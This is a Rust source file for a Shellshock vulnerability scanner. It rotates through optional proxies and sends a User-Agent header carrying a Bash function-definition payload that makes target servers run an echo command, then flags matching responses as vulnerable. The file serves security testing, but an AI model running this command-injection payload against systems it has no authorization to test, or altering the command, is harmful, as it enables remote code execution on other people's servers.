use crate::{
    types::ShellshockPaths,
    Arguments,
};
use log::{error, info, warn};
use reqwest::{Client, Proxy};
use std::{
    fs,
    sync::{Arc, atomic::{AtomicUsize, Ordering}},
};
use tokio::{task, time::{timeout, Duration}};

const TIMEOUT_SECS: u64 = 5;
const SHELLSHOCK_HEADER: &str = "() { :; }; echo; echo; /bin/bash -c 'echo shellshocked'";

pub async fn run_scanner(args: Arguments) {
    let content = match fs::read_to_string(&args.vuln_file) {
        Ok(c) => c,
        Err(e) => {
            error!("Failed to read {}: {}", &args.vuln_file, e);
            return;
        }
    };

    let paths: ShellshockPaths = match serde_yaml::from_str(&content) {
        Ok(p) => p,
        Err(e) => {
            error!("Failed to parse YAML: {}", e);
            return;
        }
    };

    let mut clients = Vec::new();

    if let Some(proxy_file) = &args.proxies {
        match fs::read_to_string(proxy_file) {
            Ok(proxy_list) => {
                for line in proxy_list.lines().filter(|l| !l.trim().is_empty()) {
                    match Proxy::all(line.trim()) {
                        Ok(proxy) => match Client::builder().proxy(proxy).build() {
                            Ok(c) => clients.push(c),
                            Err(e) => warn!("Client error for proxy {}: {}", line, e),
                        },
                        Err(e) => warn!("Invalid proxy '{}': {}", line, e),
                    }
                }
            }
            Err(e) => {
                error!("Failed to read proxies: {}", e);
                return;
            }
        }
    }

    if clients.is_empty() {
        warn!("No valid proxies. Using direct connection.");
        clients.push(Client::new());
    }

    let clients = Arc::new(clients);
    let counter = Arc::new(AtomicUsize::new(0));

    let mut tasks = Vec::new();

    for (category, endpoints) in paths.0 {
        for path in endpoints {
            let url = format!("{}{}", args.uri.trim_end_matches('/'), path.trim());
            let clients = Arc::clone(&clients);
            let counter = Arc::clone(&counter);
            let category = category.clone();

            tasks.push(task::spawn(async move {
                let index = counter.fetch_add(1, Ordering::SeqCst) % clients.len();
                let client = &clients[index];

                match timeout(Duration::from_secs(TIMEOUT_SECS), scan_url(client, &url)).await {
                    Ok(Ok(true)) => info!("[{}] vulnerable: {}", category, url),
                    Ok(Ok(false)) => error!("[{}] failed: {}", category, url),
                    Ok(Err(e)) => error!("[{}] error: {} - {}", category, url, e),
                    Err(_) => warn!("[{}] timeout: {}", category, url),
                }
            }));
        }
    }

    for t in tasks {
        let _ = t.await;
    }
}

async fn scan_url(client: &Client, url: &str) -> Result<bool, reqwest::Error> {
    let req: reqwest::RequestBuilder = client.get(url).header("User-Agent", SHELLSHOCK_HEADER);
    let res: reqwest::Response = req.send().await?;
    let text: String = res.text().await?;

    Ok(text.contains("shellshocked"))
}
